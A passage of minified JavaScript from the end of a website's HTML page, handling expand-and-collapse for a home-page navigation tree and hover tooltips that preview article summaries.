t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
